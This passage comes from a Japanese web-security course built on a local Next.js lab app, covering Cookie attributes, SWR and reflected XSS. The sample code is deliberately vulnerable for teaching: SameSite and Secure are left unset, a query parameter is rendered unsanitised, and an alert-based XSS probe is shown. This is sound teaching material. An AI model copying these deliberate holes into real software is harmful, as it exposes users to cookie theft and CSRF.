      <ul>
      <li>ローカル環境で <code>npm run dev</code> や <code>npm run build</code> で Next.js
      アプリを起動すると <strong>HTTP</strong> になります。そのため、この属性をつけると Cookie
      の送信が制限されるので注意してください。Vercel にデプロイ・ホストすればHTTPS
      通信が使用されるため Cookie は問題なく送信されます。</li>
      </ul>
      <h3 data-number="4.4.4" id="samesite属性"><span class="header-section-number">4.4.4</span>
      SameSite属性</h3>
      <p>CSRF攻撃を防ぐための重要な属性です。次の3つの値を設定できます。</p>
      <ul>
      <li><code>strict</code>: 同一サイトからのリクエストでのみ Cookie が送信されます。
      <ul>
      <li>外部サイト (<code>https://fuga.jp/</code>) から <code>https://hoge.com/</code>
      に移動した場合、<code>hoge.com</code> の <code>SameSite=Strict</code> な Cookie
      は送信されません。つまり、移動直後、<code>https://hoge.com/</code>
      からは、そのサイトに初アクセスしたときと同じレスポンスが返ってきます。UX的に不自然…。</li>
      </ul></li>
      <li><code>lax</code>:
      同一サイトからのリクエストと、トップレベルナビゲーション（リンクのクリックなど）による GET
      リクエストで Cookie が送信されます。
      <ul>
      <li>トップレベルナビゲーションとは、ユーザが <code>&lt;a href&gt;</code>
      をクリックしたり、URLを直接ブラウザに入力してページを開いたりする操作です。</li>
      </ul></li>
      <li><code>none</code>: すべてのクロスサイトリクエストで Cookie が送信されます。Secure
      属性との併用が必須となります。サードパーティ Cookie が必要な場合に使用します。
      <ul>
      <li>この設定を使用するには Secure 属性（HTTPS限定）との併用が必須になります。</li>
      </ul></li>
      </ul>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>Cookie の「SameSite属性」の strict と lax の違いが分かりません。strict にすると「ログインの
      UX が云々・・・」とか言われたのですが意味不明です🫠。具体例で解説してください。</p>
      </blockquote>
      <h3 data-number="4.4.5" id="適切なcookie属性の設定"><span
      class="header-section-number">4.4.5</span> 適切なCookie属性の設定</h3>
      <p>Cookie の属性を適切に設定することで、セキュリティを向上させつつ、ユーザビリティを保った
      Cookie の運用が可能になります。なお、上記以外にも <code>Path</code> や <code>Max-Age</code>
      などの Cookie
      の属性が存在します。それらについて、ウェブや生成AIを使って概要を把握しておいてください。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>Cookie
      の「Max-Age属性」と「Expires属性」の違いについて教えてください。また、どのように使い分けますか。</p>
      </blockquote>
      <blockquote>
      <p>Cookie
      の「SameSite属性」と「CSRF攻撃」の関係が分かりません🫠。そもそも「CSRF攻撃とは何か？」から教えてください。</p>
      </blockquote>
      <h3 data-number="4.4.6" id="javascriptから-cookie-を確認"><span
      class="header-section-number">4.4.6</span> JavaScriptから Cookie を確認</h3>
      <p>ブラウザのデベロッパーツールの「コンソール」からは、<span
      class="masked">JavaScriptコードを対話的に実行すること</span> ができます。例えば、コンソールに
      <code>document.cookie</code> と入力すれば、現在表示しているウェブサイト (ドメイン) のなかで
      <strong>HttpOnly属性</strong> が設定されていない Cookie の値を取得することができます。</p>
      <figure>
      <img src="figs/01/cookie-04.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <p>視点を変えれば、第3者👿によって、そのウェブサイトに悪意あるJavaScriptコード
      (<code>document.cookie</code>の戻り値を外部送信するようなコード)
      が埋め込まれた場合、<strong>HttpOnly属性</strong> がついていない Cookie
      が窃取される可能性があるということになります。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>Cookie
      が窃取されたからって何か困ることがあるのですか？セッションIDなんて単なる数字の羅列でしょ？セッションID
      の Cookie にHttpOnly属性を付け忘れてたら、先輩が激おこ😡💢なんですが…</p>
      </blockquote>
      <h1 data-number="5" id="ニュースのコンテンツ"><span class="header-section-number">5</span>
      「ニュース」のコンテンツ</h1>
      <ul>
      <li><a href="http://localhost:3000/news">http://localhost:3000/news</a></li>
      </ul>
      <p>このコンテンツは <code>region</code> という Cookie に設定された値
      (<code>OSAKA</code>、<code>TOKYO</code> など)
      に応じて、表示されるニュースが変わるようになっています。</p>
      <h2 data-number="5.1" id="クライアントサイド-フロントエンド-の処理"><span
      class="header-section-number">5.1</span> クライアントサイド (フロントエンド) の処理</h2>
      <p>このページにアクセスすると、クライアントサイド (フロントエンド側) で、Cookie のなかに
      <code>region</code> が存在するかをチェックして、存在しない場合は初期値として
      <code>OSAKA</code> を設定します。</p>
      <div class="sourceCode" id="cb23"
      data-caption="src/app/news/page.tsx (抜粋) useStateによる状態管理" data-startFrom="43"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 42;"><span id="cb23-43"><a href="#cb23-43"></a><span class="fu">useEffect</span>(() <span class="kw">=&gt;</span> {</span>
<span id="cb23-44"><a href="#cb23-44"></a>  <span class="kw">const</span> regionStr <span class="op">=</span> Cookies<span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;region&quot;</span>)<span class="op">;</span></span>
<span id="cb23-45"><a href="#cb23-45"></a>  <span class="co">// Cookieが存在しない もしくはデタラメな値の場合は OSAKA をセットする</span></span>
<span id="cb23-46"><a href="#cb23-46"></a>  <span class="cf">if</span> (<span class="op">!</span>regionStr <span class="op">||</span> <span class="op">!</span><span class="bu">Object</span><span class="op">.</span><span class="fu">values</span>(Region)<span class="op">.</span><span class="fu">includes</span>(regionStr <span class="im">as</span> Region)) {</span>
<span id="cb23-47"><a href="#cb23-47"></a>    <span class="fu">setSessionCookie</span>(Region<span class="op">.</span><span class="at">OSAKA</span>)<span class="op">;</span></span>
<span id="cb23-48"><a href="#cb23-48"></a>    <span class="cf">return</span><span class="op">;</span></span>
<span id="cb23-49"><a href="#cb23-49"></a>  }</span>
<span id="cb23-50"><a href="#cb23-50"></a>  <span class="fu">setRegion</span>(regionStr <span class="im">as</span> Region)<span class="op">;</span> <span class="co">// Cookieから取得した地域をセット</span></span>
<span id="cb23-51"><a href="#cb23-51"></a>}<span class="op">,</span> [])<span class="op">;</span></span></code></pre></div>
      <p>上記の <strong>第47行目</strong> で呼び出している <code>setSessionCookie</code>
      は、以下のような自作関数になっています。以降の脆弱性実験のために、あえて <code>path</code> や
      <code>sameSite</code> をコメントアウトしています。</p>
      <div class="sourceCode" id="cb24"
      data-caption="src/app/news/page.tsx (抜粋) Cookie をセットする関数" data-startFrom="27"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 26;"><span id="cb24-27"><a href="#cb24-27"></a><span class="co">// Cookie をセットする関数の定義</span></span>
<span id="cb24-28"><a href="#cb24-28"></a><span class="kw">const</span> setSessionCookie <span class="op">=</span> <span class="fu">useCallback</span>((region<span class="op">:</span> Region) <span class="kw">=&gt;</span> {</span>
<span id="cb24-29"><a href="#cb24-29"></a>  Cookies<span class="op">.</span><span class="fu">set</span>(<span class="st">&quot;region&quot;</span><span class="op">,</span> region<span class="op">,</span> {</span>
<span id="cb24-30"><a href="#cb24-30"></a>    expires<span class="op">:</span> <span class="dv">7</span><span class="op">,</span> <span class="co">// 有効期限（7日間）</span></span>
<span id="cb24-31"><a href="#cb24-31"></a>    <span class="co">// path: &quot;/api/news&quot;, // 💀 省略すると &quot;/&quot; が設定される</span></span>
<span id="cb24-32"><a href="#cb24-32"></a>    <span class="co">// sameSite: &quot;strict&quot;, // 💀 適切に設定しないとCSRF脆弱性が生じる</span></span>
<span id="cb24-33"><a href="#cb24-33"></a>    secure<span class="op">:</span> <span class="kw">false</span><span class="op">,</span> <span class="co">// 💀 本番環境(HTTPS)では true にすべき</span></span>
<span id="cb24-34"><a href="#cb24-34"></a>  })<span class="op">;</span></span>
<span id="cb24-35"><a href="#cb24-35"></a>  <span class="co">// 👆 セキュアに利用する観点から各設定の意味を調べてみてください</span></span>
<span id="cb24-36"><a href="#cb24-36"></a>}<span class="op">,</span> [])<span class="op">;</span></span></code></pre></div>
      <p>ブラウザを閉じても Cookie には値が残るので (有効期限が7日間に設定されているので)、再度
      <code>/news</code> にアクセスしたときには <span
      class="masked">最後に表示していた地域のニュースが表示</span> されるようになっています。</p>
      <div class="note type-tips">
      <p><strong>Chrome において Cookie の管理はプロファイル単位</strong></p>
      <p>Chrome では「<strong>Cookie
      はプロファイル毎に管理されている</strong>」ため、あるプロファイルで起動した Chrome
      で地域を「沖縄」に設定して <code>region=OKINAWA</code> が Cookie
      に設定されていても、別のプロファイルで起動した Chrome で <code>/news</code>
      にアクセスすれば初期値の「大阪」が表示されます。</p>
      </div>
      <p>地域毎の「ニュース記事」は、<code>useState</code> で生成したステート変数の
      <code>region</code> の変更をトリガーに <code>/api/news</code> に対する <code>fetch</code>
      を実行することで取得しています。以下の <strong>第61行目</strong> ように <code>fetch</code>
      のオプションに <code>credentials: "include"</code> を設定することで、JavaScript から
      HTTPリクエストを送るときにも Cookie が付与されるようになります。</p>
      <div class="sourceCode" id="cb25"
      data-caption="src/app/news/page.tsx (抜粋) Cookie をセットする関数" data-startFrom="55"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 54;"><span id="cb25-55"><a href="#cb25-55"></a><span class="fu">useEffect</span>(() <span class="kw">=&gt;</span> {</span>
<span id="cb25-56"><a href="#cb25-56"></a>  <span class="kw">const</span> fetchNews <span class="op">=</span> <span class="kw">async</span> () <span class="kw">=&gt;</span> {</span>
<span id="cb25-57"><a href="#cb25-57"></a>    <span class="cf">try</span> {</span>
<span id="cb25-58"><a href="#cb25-58"></a>      <span class="fu">setIsLoading</span>(<span class="kw">true</span>)<span class="op">;</span></span>
<span id="cb25-59"><a href="#cb25-59"></a>      <span class="kw">const</span> res <span class="op">=</span> <span class="cf">await</span> <span class="fu">fetch</span>(ep<span class="op">,</span> {</span>
<span id="cb25-60"><a href="#cb25-60"></a>        method<span class="op">:</span> <span class="st">&quot;GET&quot;</span><span class="op">,</span></span>
<span id="cb25-61"><a href="#cb25-61"></a>        credentials<span class="op">:</span> <span class="st">&quot;include&quot;</span><span class="op">,</span> <span class="co">// Cookieも送信</span></span>
<span id="cb25-62"><a href="#cb25-62"></a>        cache<span class="op">:</span> <span class="st">&quot;no-store&quot;</span><span class="op">,</span></span>
<span id="cb25-63"><a href="#cb25-63"></a>      })<span class="op">;</span></span>
<span id="cb25-64"><a href="#cb25-64"></a>      <span class="kw">const</span> data<span class="op">:</span> ApiResponse<span class="op">&lt;</span>NewsItem[]<span class="op">&gt;</span> <span class="op">=</span> <span class="cf">await</span> res<span class="op">.</span><span class="fu">json</span>()<span class="op">;</span></span>
<span id="cb25-65"><a href="#cb25-65"></a>      <span class="cf">if</span> (data<span class="op">.</span><span class="at">success</span>) {</span>
<span id="cb25-66"><a href="#cb25-66"></a>        <span class="fu">setNewsItems</span>(data<span class="op">.</span><span class="at">payload</span>)<span class="op">;</span></span>
<span id="cb25-67"><a href="#cb25-67"></a>      } <span class="cf">else</span> {</span>
<span id="cb25-68"><a href="#cb25-68"></a>        <span class="bu">console</span><span class="op">.</span><span class="fu">error</span>(data<span class="op">.</span><span class="at">message</span>)<span class="op">;</span></span>
<span id="cb25-69"><a href="#cb25-69"></a>      }</span>
<span id="cb25-70"><a href="#cb25-70"></a>    } <span class="cf">catch</span> (e) {</span>
<span id="cb25-71"><a href="#cb25-71"></a>      <span class="bu">console</span><span class="op">.</span><span class="fu">error</span>(<span class="st">&quot;ニュース記事取得失敗&quot;</span><span class="op">,</span> e)<span class="op">;</span></span>
<span id="cb25-72"><a href="#cb25-72"></a>    } <span class="cf">finally</span> {</span>
<span id="cb25-73"><a href="#cb25-73"></a>      <span class="fu">setIsLoading</span>(<span class="kw">false</span>)<span class="op">;</span></span>
<span id="cb25-74"><a href="#cb25-74"></a>    }</span>
<span id="cb25-75"><a href="#cb25-75"></a>  }<span class="op">;</span></span>
<span id="cb25-76"><a href="#cb25-76"></a>  <span class="fu">fetchNews</span>()<span class="op">;</span></span>
<span id="cb25-77"><a href="#cb25-77"></a>}<span class="op">,</span> [region])<span class="op">;</span></span></code></pre></div>
      <h3 data-number="5.1.1" id="演習-3"><span class="header-section-number">5.1.1</span> 演習</h3>
      <p><strong>第61行目</strong> を <code>credentials: "omit",</code> (＝Cookieを送信しない設定)
      に変えるとドロップダウンリストから地域を変更しても、常に大阪の記事しか取得できなくなることを確認してください。</p>
      <h2 data-number="5.2" id="サーバサイド-バックエンド-の処理"><span
      class="header-section-number">5.2</span> サーバサイド (バックエンド) の処理</h2>
      <p>ウェブAPI <code>/api/news</code> にアクセスがあったときの処理は
      <code>src/app/news/route.ts</code> に記述されています。サーバサイドでは、Cookie の値
      (<code>region=XXXXX</code>) に応じて DB からのデータ取得条件を変えています。</p>
      <div class="sourceCode" id="cb26" data-caption="src/app/api/news/route.ts (抜粋)"
      data-startFrom="4"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 3;"><span id="cb26-4"><a href="#cb26-4"></a><span class="im">import</span> { cookies } <span class="im">from</span> <span class="st">&quot;next/headers&quot;</span><span class="op">;</span></span></code></pre></div>
      <div class="sourceCode" id="cb27"
      data-caption="src/app/api/news/route.ts (抜粋) Cookie に応じて DB の検索条件 where を変更"
      data-startFrom="11"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 10;"><span id="cb27-11"><a href="#cb27-11"></a><span class="co">// リクエストに含まれるクッキー region の値を regionStr に取得</span></span>
<span id="cb27-12"><a href="#cb27-12"></a><span class="kw">const</span> cookieStore <span class="op">=</span> <span class="cf">await</span> <span class="fu">cookies</span>()<span class="op">;</span></span>
<span id="cb27-13"><a href="#cb27-13"></a><span class="kw">const</span> regionStr <span class="op">=</span> cookieStore<span class="op">.</span><span class="fu">get</span>(cKey)<span class="op">?.</span><span class="at">value</span> <span class="op">??</span> Region<span class="op">.</span><span class="at">OSAKA</span><span class="op">;</span></span>
<span id="cb27-14"><a href="#cb27-14"></a></span>
<span id="cb27-15"><a href="#cb27-15"></a><span class="co">// 文字列を列挙子 Region.XXXX に変換（不正な文字列は Region.OSAKA にする）</span></span>
<span id="cb27-16"><a href="#cb27-16"></a><span class="kw">const</span> region <span class="op">=</span> <span class="bu">Object</span><span class="op">.</span><span class="fu">values</span>(Region)<span class="op">.</span><span class="fu">includes</span>(regionStr <span class="im">as</span> Region)</span>
<span id="cb27-17"><a href="#cb27-17"></a>  <span class="op">?</span> (regionStr <span class="im">as</span> Region)</span>
<span id="cb27-18"><a href="#cb27-18"></a>  <span class="op">:</span> Region<span class="op">.</span><span class="at">OSAKA</span><span class="op">;</span></span>
<span id="cb27-19"><a href="#cb27-19"></a></span>
<span id="cb27-20"><a href="#cb27-20"></a><span class="co">// DBから記事を全件取得。実設計では take/skip でページネーションすべき</span></span>
<span id="cb27-21"><a href="#cb27-21"></a><span class="kw">const</span> newsItems<span class="op">:</span> NewsItem[] <span class="op">=</span> <span class="cf">await</span> prisma<span class="op">.</span><span class="at">newsItem</span><span class="op">.</span><span class="fu">findMany</span>({</span>
<span id="cb27-22"><a href="#cb27-22"></a>  where<span class="op">:</span> { region }<span class="op">,</span> <span class="co">// 検索条件</span></span>
<span id="cb27-23"><a href="#cb27-23"></a>  orderBy<span class="op">:</span> { publishedAt<span class="op">:</span> <span class="st">&quot;desc&quot;</span> }<span class="op">,</span></span>
<span id="cb27-24"><a href="#cb27-24"></a>})<span class="op">;</span></span></code></pre></div>
      <h2 data-number="5.3" id="swr-について"><span class="header-section-number">5.3</span> SWR
      について</h2>
      <p>SWR (Stale-While-Revalidate) は、データ取得をより効率的・快適に行うための React / Next.js
      向けライブラリです。<code>useState</code> と <code>useEffect</code>
      を使って記述していたデータ取得 (fetch)
      の処理を、より高機能かつシンプルに記述することができます。特に、<strong>キャッシュにある直近のデータ
      (stale) を即座に表示しつつ、裏側で最新のデータを取得 (revalidate) する戦略</strong>
      によって、UX の向上が期待できます。</p>
      <h3 data-number="5.3.1" id="swr-を使用しない実装"><span
      class="header-section-number">5.3.1</span> SWR を使用しない実装</h3>
      <p><code>src/app/news/page.tsx</code>
      のなかで、<strong>第53行目</strong>から<strong>第77行目</strong>にかけての処理
      (<code>useState</code> と <code>useEffect</code> のフェッチ処理) は…</p>
      <div class="sourceCode" id="cb28" data-caption="src/app/news/page.tsx (抜粋) "
      data-startFrom="53"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 52;"><span id="cb28-53"><a href="#cb28-53"></a><span class="co">// 初回 と region変更のタイミングでニュース記事を取得【基本的な実装】</span></span>
<span id="cb28-54"><a href="#cb28-54"></a><span class="kw">const</span> [isLoading<span class="op">,</span> setIsLoading] <span class="op">=</span> <span class="fu">useState</span>(<span class="kw">true</span>)<span class="op">;</span></span>
<span id="cb28-55"><a href="#cb28-55"></a><span class="fu">useEffect</span>(() <span class="kw">=&gt;</span> {</span>
<span id="cb28-56"><a href="#cb28-56"></a>  <span class="kw">const</span> fetchNews <span class="op">=</span> <span class="kw">async</span> () <span class="kw">=&gt;</span> {</span>
<span id="cb28-57"><a href="#cb28-57"></a>    <span class="cf">try</span> {</span>
<span id="cb28-58"><a href="#cb28-58"></a>      <span class="fu">setIsLoading</span>(<span class="kw">true</span>)<span class="op">;</span></span>
<span id="cb28-59"><a href="#cb28-59"></a>      <span class="kw">const</span> res <span class="op">=</span> <span class="cf">await</span> <span class="fu">fetch</span>(ep<span class="op">,</span> {</span>
<span id="cb28-60"><a href="#cb28-60"></a>        method<span class="op">:</span> <span class="st">&quot;GET&quot;</span><span class="op">,</span></span>
<span id="cb28-61"><a href="#cb28-61"></a>        credentials<span class="op">:</span> <span class="st">&quot;include&quot;</span><span class="op">,</span> <span class="co">// Cookieも送信</span></span>
<span id="cb28-62"><a href="#cb28-62"></a>        cache<span class="op">:</span> <span class="st">&quot;no-store&quot;</span><span class="op">,</span></span>
<span id="cb28-63"><a href="#cb28-63"></a>      })<span class="op">;</span></span>
<span id="cb28-64"><a href="#cb28-64"></a>      <span class="kw">const</span> data<span class="op">:</span> ApiResponse<span class="op">&lt;</span>NewsItem[]<span class="op">&gt;</span> <span class="op">=</span> <span class="cf">await</span> res<span class="op">.</span><span class="fu">json</span>()<span class="op">;</span></span>
<span id="cb28-65"><a href="#cb28-65"></a>      <span class="cf">if</span> (data<span class="op">.</span><span class="at">success</span>) {</span>
<span id="cb28-66"><a href="#cb28-66"></a>        <span class="fu">setNewsItems</span>(data<span class="op">.</span><span class="at">payload</span>)<span class="op">;</span></span>
<span id="cb28-67"><a href="#cb28-67"></a>      } <span class="cf">else</span> {</span>
<span id="cb28-68"><a href="#cb28-68"></a>        <span class="bu">console</span><span class="op">.</span><span class="fu">error</span>(data<span class="op">.</span><span class="at">message</span>)<span class="op">;</span></span>
<span id="cb28-69"><a href="#cb28-69"></a>      }</span>
<span id="cb28-70"><a href="#cb28-70"></a>    } <span class="cf">catch</span> (e) {</span>
<span id="cb28-71"><a href="#cb28-71"></a>      <span class="bu">console</span><span class="op">.</span><span class="fu">error</span>(<span class="st">&quot;ニュース記事取得失敗&quot;</span><span class="op">,</span> e)<span class="op">;</span></span>
<span id="cb28-72"><a href="#cb28-72"></a>    } <span class="cf">finally</span> {</span>
<span id="cb28-73"><a href="#cb28-73"></a>      <span class="fu">setIsLoading</span>(<span class="kw">false</span>)<span class="op">;</span></span>
<span id="cb28-74"><a href="#cb28-74"></a>    }</span>
<span id="cb28-75"><a href="#cb28-75"></a>  }<span class="op">;</span></span>
<span id="cb28-76"><a href="#cb28-76"></a>  <span class="fu">fetchNews</span>()<span class="op">;</span></span>
<span id="cb28-77"><a href="#cb28-77"></a>}<span class="op">,</span> [region])<span class="op">;</span></span></code></pre></div>
      <h3 data-number="5.3.2" id="swr-を使用した実装"><span
      class="header-section-number">5.3.2</span> SWR を使用した実装</h3>
      <p>現状ではコメントアウトされている <strong>第79行目</strong>から<strong>第99行目</strong>
      にかけての <code>useSWR</code> を使った処理に置き換えることができます。</p>
      <div class="sourceCode" id="cb29"
      data-caption="src/app/news/page.tsx (抜粋) useSWRによるデータ取得" data-startFrom="79"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 78;"><span id="cb29-79"><a href="#cb29-79"></a><span class="co">//【💡SWRを利用した実装】</span></span>
<span id="cb29-80"><a href="#cb29-80"></a><span class="kw">const</span> fetcher <span class="op">=</span> <span class="fu">useCallback</span>(<span class="kw">async</span> (endPoint<span class="op">:</span> <span class="dt">string</span>) <span class="kw">=&gt;</span> {</span>
<span id="cb29-81"><a href="#cb29-81"></a>  <span class="kw">const</span> res <span class="op">=</span> <span class="cf">await</span> <span class="fu">fetch</span>(endPoint<span class="op">,</span> {</span>
<span id="cb29-82"><a href="#cb29-82"></a>    credentials<span class="op">:</span> <span class="st">&quot;same-origin&quot;</span><span class="op">,</span></span>
<span id="cb29-83"><a href="#cb29-83"></a>    cache<span class="op">:</span> <span class="st">&quot;no-store&quot;</span><span class="op">,</span></span>
<span id="cb29-84"><a href="#cb29-84"></a>  })<span class="op">;</span></span>
<span id="cb29-85"><a href="#cb29-85"></a>  <span class="cf">return</span> res<span class="op">.</span><span class="fu">json</span>()<span class="op">;</span></span>
<span id="cb29-86"><a href="#cb29-86"></a>}<span class="op">,</span> [])<span class="op">;</span></span>
<span id="cb29-87"><a href="#cb29-87"></a></span>
<span id="cb29-88"><a href="#cb29-88"></a><span class="kw">const</span> { data<span class="op">:</span> news<span class="op">,</span> isLoading } <span class="op">=</span> <span class="fu">useSWR</span><span class="op">&lt;</span>ApiResponse<span class="op">&lt;</span>NewsItem[]<span class="op">&gt;&gt;</span>(</span>
<span id="cb29-89"><a href="#cb29-89"></a>  ep<span class="op">,</span></span>
<span id="cb29-90"><a href="#cb29-90"></a>  fetcher<span class="op">,</span></span>
<span id="cb29-91"><a href="#cb29-91"></a>)<span class="op">;</span></span>
<span id="cb29-92"><a href="#cb29-92"></a></span>
<span id="cb29-93"><a href="#cb29-93"></a><span class="fu">useEffect</span>(() <span class="kw">=&gt;</span> {</span>
<span id="cb29-94"><a href="#cb29-94"></a>  <span class="cf">if</span> (news <span class="op">&amp;&amp;</span> news<span class="op">.</span><span class="at">success</span>) <span class="fu">setNewsItems</span>(news<span class="op">.</span><span class="at">payload</span>)<span class="op">;</span></span>
<span id="cb29-95"><a href="#cb29-95"></a>}<span class="op">,</span> [news])<span class="op">;</span></span>
<span id="cb29-96"><a href="#cb29-96"></a></span>
<span id="cb29-97"><a href="#cb29-97"></a><span class="fu">useEffect</span>(() <span class="kw">=&gt;</span> {</span>
<span id="cb29-98"><a href="#cb29-98"></a>  <span class="fu">mutate</span>(ep)<span class="op">;</span> <span class="co">// 再検証(キャッシュ無効化して再取得)</span></span>
<span id="cb29-99"><a href="#cb29-99"></a>}<span class="op">,</span> [region])<span class="op">;</span></span></code></pre></div>
      <p><strong>第97行目</strong> から <strong>第99行目</strong> では、<code>region</code>
      が変わった際にキャッシュを明示的に破棄し、最新のデータ取得を強制する処理をしています。<code>mutate(ep)</code>
      は、引数 <code>ep</code> (実体は <code>/api/news</code>)
      から最新データを取得する命令になります。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>Next.js で、useState と useEffect を組み合わせて api
      からデータをフェッチしてくる処理を書いていたのですが、先輩からコードレビューで「useSWR
      を使ったほうがいいよ！」と言われました。SWR
      とか聞いたことがないのですが、使っている人はいるのでしょうか？マニアックな先輩しか使わないようなマイナーなライブラリなら手を出したくないのですが…😅</p>
      </blockquote>
      <blockquote>
      <p>Next.js の useSWR の mutate
      って関数の使いどころが分かりません。ウェブAPIからデータを再フェッチ（手動で強制更新）したいときに使うのですか？</p>
      </blockquote>
      <h3 data-number="5.3.3" id="演習-4"><span class="header-section-number">5.3.3</span> 演習</h3>
      <p><strong>第54行目</strong>から<strong>第77行目</strong> をコメントアウトして、
      <strong>第80行目</strong>から<strong>第99行目</strong>
      のコメントアウトを解除してください。その後、<code>/news</code>
      が同様に機能することを確認してください。</p>
      <p>また、useSWR を使った方がわずかに UX が向上していることを確認してください
      (ニュースからトップページに移動して、その後、再びニュースに戻ったときの記事が表示されるまでの時間が短くなっているはずです)。</p>
      <h1 data-number="6" id="ショップのコンテンツ"><span class="header-section-number">6</span>
      「ショップ」のコンテンツ</h1>
      <p>ショップ (<a href="http://localhost:3000/shop">http://localhost:3000/shop</a>)は
      <strong>Cookie を利用してショッピングカート内の商品保持する機能</strong>
      を持ったサンプルです。AIの支援を受けながら、以下のコードを読解してください。</p>
      <ul>
      <li><code>src/app/shop/page.tsx</code> … フロントエンド</li>
      <li><code>src/app/api/products/route.ts</code> … 商品一覧の取得 (GET)</li>
      <li><code>src/app/api/cart/route.ts</code> … カート情報の取得と更新 (GET/PATCH)</li>
      </ul>
      <p>「ニュース」では <span class="masked">クライアントサイドで Cookie を発行</span>
      していましたが、「ショップ」では <strong>サーバサイド</strong>
      (<code>src/app/cart/route.ts</code>) で Cookie
      を発行しています。なお、Cookieの属性設定に不適切なものがありますが、次の「XSS脆弱性」のセクションに関係するものなので、そのままにしておいてください。</p>
      <h1 data-number="7" id="xss脆弱性"><span class="header-section-number">7</span> XSS脆弱性</h1>
      <p><strong>XSS</strong> (Cross-Site Scripting: クロスサイトスクリプティング)
      は、ウェブページのなかに、外部から <strong>悪意のあるJavaScriptコード</strong>
      を埋め込むことで、ユーザのウェブブラウザ上で「<strong>意図しない処理 (JavaScriptプログラム)
      を強制実行させる脆弱性</strong>」です。</p>
      <p>例えば、掲示板やコメント欄などに <code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code>
      のような「HTMLタグ」が投稿されたとき、それがサーバサイドで、適切に <strong>サニタイズ (無害化)
      やエスケープ処理がされないままに</strong> <span
      class="masked">そのまま「HTML」としてブラウザに出力</span>
      されると、他の閲覧者のブラウザ上でそのスクリプト
      (<code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code>) が実行されてしまいます。</p>
      <p>実行される JavaScriptコード
      が単にアラートを表示する程度のものであれば大した問題ではありません。しかし、強制実行される
      JavaScriptコード が「<strong>Cookie情報の窃取</strong>」や「<strong>別のサイト
      (フィッシングサイト) へのリダイレクト</strong>」、さらには「<strong>ユーザの意図しない操作
      (XX予告の投稿操作やアカウント削除操作)</strong>」といった場合があり、これは非常に大きな問題となります。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>ウェブアプリ開発およびXSS脆弱性の文脈で「サニタイズ処理」と「エスケープ処理」とはなんですか。また、それらの違いについて教えてください。</p>
      </blockquote>
      <h2 data-number="7.1" id="実はニュースには反射型xssの潜在的リスクがある"><span
      class="header-section-number">7.1</span>
      実は「ニュース」には反射型XSSの潜在的リスクがある</h2>
      <p>ニュース (<code>src/app/news/page.tsx</code>) ですが、実は <a
      href="http://localhost:3000/news?name=寝屋川タヌキ">http://localhost:3000/news?name=寝屋川タヌキ</a>
      のような <strong>クエリパラメータ</strong>(<code>name</code>)
      を受け付ける仕様となっています。</p>
      <p>そして、<strong>そのクエリパラメータを無害化処理やエスケープ処理することなく画面に出力する実装</strong>
      となっています。これは「<strong>反射型XSS (Reflected
      XSS)</strong>」と呼ばれるタイプの脆弱性を持った超NGな実装となります。</p>
      <figure>
      <img src="figs/01/xss-01.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <p>上記の例のように <code>name=寝屋川タヌキ</code>
      をクエリパラメータとして与える分には特段の問題は生じません。しかし、<code>name=【JavaScriptプログラム】</code>
      が与えられるたとき<strong>非常に危険な動作</strong>をします。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>URLのクエリパラメータにJSを仕込むようなのが反射型XSSであると聞きました。それ以外にもXSSにタイプがあるのですか？</p>
      </blockquote>
      <h2 data-number="7.2" id="クエリパラメータの処理"><span
      class="header-section-number">7.2</span> クエリパラメータの処理</h2>
      <p>まずは <code>src/app/news/page.tsx</code>
      のなかでクエリパラメータが、どのように処理されているかを確認しています。</p>
      <div class="sourceCode" id="cb30"
      data-caption="src/app/news/page.tsx (抜粋) useStateによる状態管理" data-startFrom="25"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 24;"><span id="cb30-25"><a href="#cb30-25"></a><span class="kw">const</span> [name<span class="op">,</span> setName] <span class="op">=</span> <span class="fu">useState</span><span class="op">&lt;</span><span class="dt">string</span> <span class="op">|</span> <span class="dt">null</span><span class="op">&gt;</span>(<span class="kw">null</span>)<span class="op">;</span></span></code></pre></div>
      <div class="sourceCode" id="cb31"
      data-caption="src/app/news/page.tsx (抜粋) クエリパラメータ name=XXXX の取得"
      data-startFrom="38"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 37;"><span id="cb31-38"><a href="#cb31-38"></a><span class="fu">useEffect</span>(() <span class="kw">=&gt;</span> {</span>
<span id="cb31-39"><a href="#cb31-39"></a>  <span class="kw">const</span> params <span class="op">=</span> <span class="kw">new</span> <span class="fu">URLSearchParams</span>(<span class="bu">window</span><span class="op">.</span><span class="at">location</span><span class="op">.</span><span class="at">search</span>)<span class="op">;</span></span>
<span id="cb31-40"><a href="#cb31-40"></a>  <span class="fu">setName</span>(params<span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;name&quot;</span>))<span class="op">;</span> <span class="co">// 💀 サニタイズ（無害化）ぜずに値を格納</span></span>
<span id="cb31-41"><a href="#cb31-41"></a>}<span class="op">,</span> [])<span class="op">;</span></span></code></pre></div>
      <div class="sourceCode" id="cb32"
      data-caption="src/app/news/page.tsx (抜粋) サニタイズせずに出力" data-startFrom="140"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 139;"><span id="cb32-140"><a href="#cb32-140"></a>{name <span class="op">&amp;&amp;</span> (</span>
